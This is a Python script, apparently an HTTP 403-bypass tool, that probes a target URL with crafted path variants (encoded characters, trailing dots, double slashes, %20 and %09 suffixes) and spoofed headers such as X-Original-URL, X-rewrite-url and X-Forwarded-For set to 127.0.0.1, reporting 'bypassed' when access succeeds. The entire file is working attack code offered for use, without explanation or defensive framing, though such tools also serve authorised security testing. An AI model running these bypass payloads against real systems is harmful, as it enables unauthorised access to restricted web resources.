import requests
import re
from ipaddress import IPv4Network
def add_url_encode(url,path):
    payload = (f"{url}/%e2/{path}")
    r = requests.get(payload)
    print(f"{payload} --> {r.status_code}")


def add_dot(url,path):
    payload = f"{url}/{path}/."
    r = requests.get(payload)
    print(f"{payload} --> {r.status_code}")


def add_two_slashes(url,path):
    payload = f"{url}//{path}//"
    r = requests.get(payload)
    print(f"{payload} --> {r.status_code}")


def add_two_dots(url,path):
     #$1/./$2/./
    payload = f"{url}/./{path}/./"
    r = requests.get(payload)
    print(f"{payload} --> {r.status_code}")


def add_original_header(url,path):
    payload = f"{url}/{path}/"
    r = requests.get(payload,headers={"X-Original-URL": f"{path}"})
    print(f"X-Original-URL --> {payload} --> {r.status_code}")


def add_slash(url):
    newurl = x = re.findall("/.{1,100}", url)
    newurl = newurl[0].replace("/","//")
    newurl = newurl.replace("////","//")
    newurl = ("https:"+newurl)
    r = requests.get(newurl)
    if(r.status_code == 200):
        print("bypassed: ",newurl)

def rewrite(url,path):
    payload = f"{url}/{path}/"
    r = requests.get(payload,headers={"X-rewrite-url": f"{path}"})
    print(f"X-rewrite-url --> {payload} --> {r.status_code}")
def add_header(url):

    a,b,c,d = {"X-Forwarded-For" : "127.0.0.1"},{"X-Forwarded-Host" : "127.0.0.1"},{"X-Custom-IP-Authorization": "127.0.0.1",},{"X-Forwarded-For":"http://127.0.0.1"}
    for i in a,b,c,d:
        r = requests.get(url,headers=i)  
        if(r.status_code == 200):
            print("bypassed "," ",i)

def add_space_url_encode(url,path):
    payload = f"{url}/{path}%20"
    r = requests.get(payload)
    print(f"{payload} --> {r.status_code}")

    payload = f"{url}/{path}%09"
    r = requests.get(payload)
    print(f"{payload} --> {r.status_code}")

    payload = f"{url}/{path}?"
    r = requests.get(payload)
    print(f"{payload} --> {r.status_code}")

    payload = f"{url}/{path}.html"
    r = requests.get(payload)
    print(f"{payload} --> {r.status_code}")

    payload = f"{url}/{path}?asds"
    r = requests.get(payload)
    print(f"{payload} --> {r.status_code}")

    payload = f"{url}/{path}#"
    r = requests.get(payload)
    print(f"{payload} --> {r.status_code}")
def post_content_lenght(url):
    r4 = requests.post(url,headers={"Content-Length": "0"})
    if(r4.status_code == 200):
        print("post request and Content-Length:0")

